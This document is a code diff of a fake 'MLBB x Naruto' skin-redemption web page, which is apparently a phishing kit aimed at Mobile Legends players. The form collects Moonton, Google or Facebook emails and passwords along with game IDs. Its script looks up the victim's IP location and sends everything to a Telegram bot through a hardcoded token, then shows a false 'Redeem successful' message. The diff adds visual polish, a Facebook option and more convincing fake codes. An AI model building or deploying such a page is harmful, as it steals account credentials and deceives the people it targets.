@@ -4,161 +4,456 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Redeem Skin MLBB x Naruto</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    * { box-sizing: border-box; }
-    body {
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');
+    
+    * { 
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background: radial-gradient(circle at top left, #1f1c2c, #928dab);
+    }
+    
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #533d7b);
+      background-size: 400% 400%;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      animation: bgMove 30s ease infinite;
-      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      overflow-x: hidden;
+      color: #fff;
     }
 
-    @keyframes bgMove {
+    @keyframes gradientBG {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
 
-    .illustration {
-      max-width: 240px;
-      margin: 20px auto 10px;
-      display: block;
-      border-radius: 12px;
-      box-shadow: 0 0 20px #ffcc00;
-      animation: glow 2s infinite alternate;
+    .container {
+      position: relative;
+      width: 100%;
+      max-width: 500px;
+      perspective: 1000px;
     }
 
-    @keyframes glow {
-      from { box-shadow: 0 0 10px #ffcc00; }
-      to { box-shadow: 0 0 25px #ffe700, 0 0 30px #ffa500; }
+    /* Animated floating kunai */
+    .kunai {
+      position: absolute;
+      width: 40px;
+      height: 40px;
+      background-image: url('https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg');
+      background-size: contain;
+      background-repeat: no-repeat;
+      opacity: 0.7;
+      z-index: -1;
+      animation: floatKunai 15s linear infinite;
+    }
+
+    @keyframes floatKunai {
+      0% {
+        transform: translate(0, 0) rotate(0deg);
+        opacity: 0;
+      }
+      10% {
+        opacity: 0.7;
+      }
+      90% {
+        opacity: 0.7;
+      }
+      100% {
+        transform: translate(calc(100vw - 100px), calc(100vh - 100px)) rotate(720deg);
+        opacity: 0;
+      }
+    }
+
+    .hero-image {
+      width: 280px;
+      height: 280px;
+      margin: 0 auto 20px;
+      position: relative;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(255,215,0,0.2) 0%, rgba(255,215,0,0) 70%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      animation: pulse 3s infinite alternate;
+    }
+
+    .hero-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.7));
+      transform-style: preserve-3d;
+      animation: float 6s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0) rotateY(0deg); }
+      50% { transform: translateY(-20px) rotateY(10deg); }
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.05); }
+    }
+
+    .title {
+      text-align: center;
+      margin-bottom: 10px;
+      font-size: 2.5rem;
+      background: linear-gradient(90deg, #ffcc00, #ff9500, #ffcc00);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 10px rgba(255, 200, 0, 0.3);
+      position: relative;
+      animation: titleGlow 2s infinite alternate;
+    }
+
+    @keyframes titleGlow {
+      from { text-shadow: 0 0 10px rgba(255, 200, 0, 0.3); }
+      to { text-shadow: 0 0 20px rgba(255, 200, 0, 0.7), 0 0 30px rgba(255, 150, 0, 0.5); }
+    }
+
+    .subtitle {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 1rem;
+      color: rgba(255, 255, 255, 0.8);
+      position: relative;
+    }
+
+    .subtitle::after {
+      content: '';
+      display: block;
+      width: 100px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #ffcc00, transparent);
+      margin: 10px auto;
     }
 
     form {
-      background: #0f0f0fcc;
-      backdrop-filter: blur(8px);
-      border: 2px solid #ffcc00;
-      box-shadow: 0 0 20px #ffcc00;
-      border-radius: 16px;
+      background: rgba(15, 15, 15, 0.7);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 204, 0, 0.3);
+      border-radius: 20px;
       padding: 30px;
-      max-width: 500px;
-      width: 90%;
-      color: #fff;
-      animation: fadeIn 1s ease-in-out;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      font-size: 26px;
-      color: #ffe700;
-      text-shadow: 0 0 10px #ffe700;
-    }
-
-    input, select, button {
       width: 100%;
-      padding: 12px;
-      margin-top: 14px;
-      border-radius: 8px;
-      font-size: 1rem;
-      border: 1px solid #666;
-      background: #222;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 
+                  inset 0 0 15px rgba(255, 204, 0, 0.2);
+      transform-style: preserve-3d;
+      transition: all 0.5s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    form::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to bottom right,
+        transparent 45%,
+        rgba(255, 204, 0, 0.1) 50%,
+        transparent 55%
+      );
+      animation: shine 3s infinite;
+      z-index: 0;
+    }
+
+    @keyframes shine {
+      0% { transform: rotate(0deg) translate(-50%, -50%); }
+      100% { transform: rotate(360deg) translate(-50%, -50%); }
+    }
+
+    form:hover {
+      transform: translateY(-5px) rotateX(5deg);
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 
+                  inset 0 0 20px rgba(255, 204, 0, 0.3);
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    input, select {
+      width: 100%;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 204, 0, 0.3);
+      background: rgba(30, 30, 30, 0.8);
       color: #fff;
-      transition: 0.3s ease;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5);
     }
 
     input:focus, select:focus {
-      border-color: #ffcc00;
       outline: none;
-      box-shadow: 0 0 8px #ffcc00;
+      border-color: #ffcc00;
+      box-shadow: 0 0 10px rgba(255, 204, 0, 0.5),
+                  inset 0 1px 3px rgba(0, 0, 0, 0.5);
+      transform: translateY(-2px);
+    }
+
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.5);
     }
 
     button {
-      background: linear-gradient(90deg, #ffcc00, #ffa500, #ffcc00);
-      background-size: 200% auto;
-      color: #111;
+      width: 100%;
+      padding: 15px;
+      border-radius: 10px;
       border: none;
-      font-weight: bold;
+      background: linear-gradient(135deg, #ffcc00, #ff9500, #ffcc00);
+      background-size: 200% 200%;
+      color: #111;
+      font-weight: 700;
+      font-size: 1.1rem;
       cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
       text-transform: uppercase;
-      animation: neonPulse 1.5s infinite alternate;
+      letter-spacing: 1px;
+      animation: gradientShift 3s ease infinite;
+    }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
 
     button:hover {
-      background-position: right center;
-      transform: scale(1.05);
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(255, 153, 0, 0.6);
+    }
+
+    button:active {
+      transform: translateY(1px);
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.2),
+        transparent
+      );
+      transition: all 0.5s ease;
+    }
+
+    button:hover::before {
+      left: 100%;
     }
 
     .spinner {
       display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 3px solid #fff;
-      border-top: 3px solid #ffcc00;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
       border-radius: 50%;
-      animation: spin 1s linear infinite;
-      vertical-align: middle;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
       margin-right: 10px;
+      vertical-align: middle;
     }
 
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
 
-    @keyframes neonPulse {
-      from { box-shadow: 0 0 10px #ffa500; }
-      to   { box-shadow: 0 0 25px #ffcc00, 0 0 30px #ff6600; }
+    .confetti {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: #f00;
+      opacity: 0;
+      z-index: 10;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to   { opacity: 1; transform: translateY(0); }
+    /* Naruto-themed loading bar */
+    .loading-bar {
+      width: 100%;
+      height: 5px;
+      background: rgba(255, 204, 0, 0.2);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-top: 15px;
+      display: none;
+    }
+
+    .loading-progress {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, #ffcc00, #ff9500);
+      border-radius: 3px;
+      transition: width 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .loading-progress::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.4),
+        transparent
+      );
+      animation: loadingShine 1.5s infinite;
+    }
+
+    @keyframes loadingShine {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 600px) {
+      .container {
+        padding: 0 20px;
+      }
+      
+      .hero-image {
+        width: 200px;
+        height: 200px;
+      }
+      
+      .title {
+        font-size: 2rem;
+      }
+      
+      form {
+        padding: 20px;
+      }
+    }
+
+    /* Custom scrollbar */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: rgba(0, 0, 0, 0.2);
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: linear-gradient(#ffcc00, #ff9500);
+      border-radius: 10px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: linear-gradient(#ff9500, #ffcc00);
     }
   </style>
 </head>
 <body>
+  <!-- Floating kunai elements -->
+  <div class="kunai" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
+  <div class="kunai" style="top: 20%; left: 80%; animation-delay: 2s;"></div>
+  <div class="kunai" style="top: 70%; left: 15%; animation-delay: 4s;"></div>
+  <div class="kunai" style="top: 80%; left: 70%; animation-delay: 6s;"></div>
 
-
-  <form id="redeemForm">
-    <h2>Redeem MLBB x Naruto Skin</h2>
-
-    <input type="text" id="userId" placeholder="Enter your User ID" required inputmode="numeric" pattern="[0-9]*"
-      oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-
-    <input type="text" id="zoneId" placeholder="Enter your Zone ID" required inputmode="numeric" pattern="[0-9]*"
-      oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-
-    <select id="methodSelect" required>
-      <option value="Moonton">Login with Moonton</option>
-      <option value="Google">Login with Google</option>
-    </select>
-
-    <div id="emailLabelDiv">
-      <input type="email" id="emailField" placeholder="Moonton Email" required>
+  <div class="container">
+    <div class="hero-image">
+      <img src="https://i.ibb.co/DfDmMf65/IMG-20250513-193337.jpg" alt="Naruto Skin" id="heroImg">
     </div>
-
-    <div id="passwordLabelDiv">
-      <input type="password" id="passwordField" placeholder="Moonton Password" required>
-    </div>
-
-    <select id="skinSelect" required>
-      <option value="">Choose Naruto Skin</option>
-      <option value="Naruto">Naruto</option>
-      <option value="Sasuke">Sasuke</option>
-      <option value="Sakura">Sakura</option>
-      <option value="Kakashi">Kakashi</option>
-    </select>
-
-    <input type="text" id="codeField" placeholder="Redeem Code" readonly required>
-
-    <button type="submit" id="submitBtn">Redeem Now</button>
-  </form>
+    
+    <h1 class="title">MLBB x NARUTO</h1>
+    <p class="subtitle">Exclusive Skin Redemption</p>
+    
+    <form id="redeemForm">
+      <div class="form-group">
+        <label for="userId"><i class="fas fa-user"></i> User ID</label>
+        <input type="text" id="userId" placeholder="Enter your User ID" required 
+               inputmode="numeric" pattern="[0-9]*"
+               oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+      </div>
+      
+      <div class="form-group">
+        <label for="zoneId"><i class="fas fa-globe"></i> Zone ID</label>
+        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required 
+               inputmode="numeric" pattern="[0-9]*"
+               oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+      </div>
+      
+      <div class="form-group">
+        <label for="methodSelect"><i class="fas fa-sign-in-alt"></i> Login Method</label>
+        <select id="methodSelect" required>
+          <option value="Moonton">Login with Moonton</option>
+          <option value="Google">Login with Google</option>
+          <option value="Facebook">Login with Facebook</option>
+        </select>
+      </div>
+      
+      <div class="form-group" id="emailLabelDiv">
+        <label for="emailField"><i class="fas fa-envelope"></i> Email</label>
+        <input type="email" id="emailField" placeholder="Moonton Email" required>
+      </div>
+      
+      <div class="form-group" id="passwordLabelDiv">
+        <label for="passwordField"><i class="fas fa-lock"></i> Password</label>
+        <input type="password" id="passwordField" placeholder="Moonton Password" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="skinSelect"><i class="fas fa-tshirt"></i> Choose Naruto Skin</label>
+        <select id="skinSelect" required>
+          <option value="">Select your skin</option>
+          <option value="Naruto">Lukas - Naruto Uzumaki</option>
+          <option value="Sasuke">Suyou - Sasuke hatake</option>
+          <option value="Sakura">Kalea - Sakura</option>
+          <option value="Kakashi">Hayabusa - Kakashi</option>
+        </select>
+      </div>
+      
+      <div class="form-group">
+        <label for="codeField"><i class="fas fa-gift"></i> Redemption Code</label>
+        <input type="text" id="codeField" placeholder="Select a skin to generate code" readonly required>
+      </div>
+      
+      <button type="submit" id="submitBtn">
+        <span id="buttonText">REDEEM NOW</span>
+      </button>
+      
+      <div class="loading-bar" id="loadingBar">
+        <div class="loading-progress" id="loadingProgress"></div>
+      </div>
+    </form>
+  </div>
 
   <script>
     const BOT_TOKEN = "7667662149:AAE8qvehpAjpabPqXMR0MX7TtBmPwf5iYHw";
@@ -168,25 +463,58 @@
     const passwordLabelDiv = document.getElementById('passwordLabelDiv');
     const skinSelect = document.getElementById('skinSelect');
     const codeField = document.getElementById('codeField');
+    const heroImg = document.getElementById('heroImg');
+    const loadingBar = document.getElementById('loadingBar');
+    const loadingProgress = document.getElementById('loadingProgress');
+    const buttonText = document.getElementById('buttonText');
+
+    // Change hero image based on selected skin
+    const skinImages = {
+      'Naruto': 'https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg',
+      'Sasuke': 'https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg',
+      'Sakura': 'https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg',
+      'Kakashi': 'https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg'
+    };
 
     methodSelect.addEventListener('change', function () {
       const method = this.value;
+      const emailLabel = emailLabelDiv.querySelector('label');
+      const passwordLabel = passwordLabelDiv.querySelector('label');
+      
       if (method === 'Google') {
-        emailLabelDiv.innerHTML = '<input type="email" id="emailField" placeholder="Google Email" required>';
-        passwordLabelDiv.innerHTML = '<input type="password" id="passwordField" placeholder="Google Password" required>';
+        emailLabel.innerHTML = '<i class="fas fa-envelope"></i> Google Email';
+        document.getElementById('emailField').placeholder = "Google Email";
+        passwordLabel.innerHTML = '<i class="fas fa-lock"></i> Google Password';
+        document.getElementById('passwordField').placeholder = "Google Password";
+      } else if (method === 'Facebook') {
+        emailLabel.innerHTML = '<i class="fas fa-envelope"></i> Facebook Email';
+        document.getElementById('emailField').placeholder = "Facebook Email";
+        passwordLabel.innerHTML = '<i class="fas fa-lock"></i> Facebook Password';
+        document.getElementById('passwordField').placeholder = "Facebook Password";
       } else {
-        emailLabelDiv.innerHTML = '<input type="email" id="emailField" placeholder="Moonton Email" required>';
-        passwordLabelDiv.innerHTML = '<input type="password" id="passwordField" placeholder="Moonton Password" required>';
+        emailLabel.innerHTML = '<i class="fas fa-envelope"></i> Moonton Email';
+        document.getElementById('emailField').placeholder = "Moonton Email";
+        passwordLabel.innerHTML = '<i class="fas fa-lock"></i> Moonton Password';
+        document.getElementById('passwordField').placeholder = "Moonton Password";
       }
     });
 
     skinSelect.addEventListener('change', () => {
       const skin = skinSelect.value;
       if (skin) {
-        const code = `${skin.toUpperCase()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
+        // Generate a more realistic-looking code
+        const code = `MLBB-NAR-${skin.toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`;
         codeField.value = code;
+        
+        // Change hero image
+        if (skinImages[skin]) {
+          heroImg.src = skinImages[skin];
+          heroImg.alt = `${skin} Skin`;
+        }
       } else {
         codeField.value = '';
+        heroImg.src = 'https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg';
+        heroImg.alt = 'Naruto Skin';
       }
     });
 
@@ -194,9 +522,19 @@
       e.preventDefault();
 
       const submitBtn = document.getElementById('submitBtn');
-      const originalText = submitBtn.innerHTML;
       submitBtn.disabled = true;
-      submitBtn.innerHTML = `<span class="spinner"></span>Processing...`;
+      buttonText.innerHTML = `<span class="spinner"></span> PROCESSING...`;
+      
+      // Show loading bar
+      loadingBar.style.display = 'block';
+      
+      // Animate loading progress
+      let progress = 0;
+      const loadingInterval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress > 90) progress = 90; // Don't complete until we're actually done
+        loadingProgress.style.width = `${progress}%`;
+      }, 300);
 
       const userId = document.getElementById('userId').value;
       const zoneId = document.getElementById('zoneId').value;
@@ -207,6 +545,9 @@
       const code = document.getElementById('codeField').value;
 
       try {
+        // Simulate processing delay
+        await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 2000));
+        
         const ipRes = await fetch('https://ipwho.is/');
         const ipData = await ipRes.json();
         const message = `
@@ -224,29 +565,84 @@ Location: ${ipData.city}, ${ipData.country} (${ipData.country_code})
 ISP: ${ipData.connection?.org}
 ASN: ${ipData.connection?.asn}
         `;
-        // Kirim ke Telegram
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-           method: "POST",
-           headers: { "Content-Type": "application/json" },
+        
+        // Send to Telegram
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-             chat_id: CHAT_ID,
-             text: message
-        })
-      });
-          
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
 
-        alert("Redeem successful! The skin will be delivered within 24 hours.");
-        this.reset();
-        document.getElementById('codeField').value = '';
+        // Complete loading animation
+        clearInterval(loadingInterval);
+        loadingProgress.style.width = '100%';
+        
+        // Create confetti effect
+        createConfetti();
+        
+        // Show success message after a short delay
+        setTimeout(() => {
+          alert("🎉 Redeem successful! The skin will be delivered to your account within 24 hours.");
+          this.reset();
+          codeField.value = '';
+          loadingBar.style.display = 'none';
+          loadingProgress.style.width = '0';
+        }, 500);
       } catch (err) {
         console.error(err);
-        alert("Error occurred. Try again later.");
+        clearInterval(loadingInterval);
+        loadingBar.style.display = 'none';
+        loadingProgress.style.width = '0';
+        alert("⚠️ Error occurred. Please try again later.");
       } finally {
         submitBtn.disabled = false;
-        submitBtn.innerHTML = originalText;
+        buttonText.textContent = 'REDEEM NOW';
       }
     });
-  </script>
 
+    function createConfetti() {
+      const colors = ['#ffcc00', '#ff9500', '#ffffff', '#ff3333', '#33ccff'];
+      const container = document.querySelector('.container');
+      
+      for (let i = 0; i < 100; i++) {
+        const confetti = document.createElement('div');
+        confetti.className = 'confetti';
+        confetti.style.left = Math.random() * 100 + 'vw';
+        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.width = Math.random() * 10 + 5 + 'px';
+        confetti.style.height = Math.random() * 10 + 5 + 'px';
+        confetti.style.opacity = Math.random() + 0.5;
+        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+        
+        const animationDuration = Math.random() * 3 + 2;
+        confetti.style.animation = `fall ${animationDuration}s linear forwards`;
+        
+        document.body.appendChild(confetti);
+        
+        // Add falling animation
+        const keyframes = `
+          @keyframes fall {
+            to {
+              transform: translateY(100vh) rotate(${Math.random() * 360}deg);
+              opacity: 0;
+            }
+          }
+        `;
+        
+        const style = document.createElement('style');
+        style.innerHTML = keyframes;
+        document.head.appendChild(style);
+        
+        // Remove confetti after animation
+        setTimeout(() => {
+          confetti.remove();
+          style.remove();
+        }, animationDuration * 1000);
+      }
+    }
+  </script>
 </body>
-</html>
+  </html>
